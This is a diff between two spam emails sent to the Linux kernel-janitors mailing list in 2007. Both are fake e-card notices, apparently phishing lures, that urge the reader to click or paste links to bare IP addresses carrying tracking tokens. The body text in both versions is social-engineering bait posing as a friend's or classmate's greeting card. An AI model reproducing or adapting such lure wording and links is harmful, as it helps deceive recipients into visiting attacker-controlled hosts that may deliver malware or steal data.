@@ -1,7 +1,7 @@
-From: "2000Greetings.Com" <axk@consolidated.net>
-Date: Tue, 03 Jul 2007 12:09:53 +0000
-Subject: [KJ] You've received a greeting card from a class mate!
-Message-Id: <002d01c7bd6b$1080df20$6321bb6e@ikozh.ljppu>
+From: "MyPostcards.Com" <uyxph@drake.edu>
+Date: Fri, 06 Jul 2007 19:28:25 +0000
+Subject: [KJ] You've received a greeting card from a Friend!
+Message-Id: <002701c7c003$d2867310$cee75243@ccq.qey>
 List-Id: <kernel-janitors.vger.kernel.org>
 References: <000701c7bb37$1b8365e0$85df394a@ct.pdnx>
 In-Reply-To: <000701c7bb37$1b8365e0$85df394a@ct.pdnx>
@@ -10,41 +10,41 @@ Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 To: kernel-janitors@vger.kernel.org
 
-Good day.
+Hi. Friend has sent you a greeting card.
+See your card as often as you wish during the next 15 days.
 
-Your class mate has sent you a greeting card from 2000Greetings.Com.
+SEEING YOUR CARD
 
-Send free ecards from 2000Greetings.Com with your choice of colors, words and music.
+If your email software creates links to Web pages, click on your 
+card's direct www address below while you are connected to the Internet:
 
-Your ecard will be available with us for the next 30 days. If you wish to keep 
-the ecard longer, you may save it on your computer or take a print.
+http://190.46.105.147/?b516c3c2cd8a7c0b58e47d14c775ed217
 
-To view your ecard, choose from any of the following options:
+Or copy and paste it into your browser's "Location" box (where Internet 
+addresses go).
+     
 
---------
-OPTION 1
---------
 
-Click on the following Internet address or
-copy & paste it into your browser's address box.
+PRIVACY
+MyPostcards.Com honors your privacy. Our home page and Card Pick Up have links to our 
+Privacy Policy.
 
-http://75.64.100.129/?3e5868911e6c36a4bc955099675c5
+TERMS OF USE
+By accessing your card you agree we have no liability. 
+If you don't know the person sending the card or don't wish to see the card, 
+please disregard this Announcement.
 
---------
-OPTION 2
---------
+We hope you enjoy your awesome card.
 
-Copy & paste the ecard number in the "View Your Card" box at 
-http://75.64.100.129/
-
-Your ecard number is
-3e5868911e6c36a4bc955099675c5
-
-Best wishes,
-Mailer-Daemon,
-2000Greetings.Com
+Wishing you the best,
+Webmaster,
+MyPostcards.Com
 
 _______________________________________________
+REMINDER: this mailing list moved to vger.kernel.org and current one will be discontinued soon.
+To resubscribe, send email to majordomo@vger.kernel.org with
+&quot;subscribe kernel-janitors&quot; in message body and follow instructions.
+
 Kernel-janitors mailing list
 Kernel-janitors@lists.linux-foundation.org
 https://lists.linux-foundation.org/mailman/listinfo/kernel-janitors
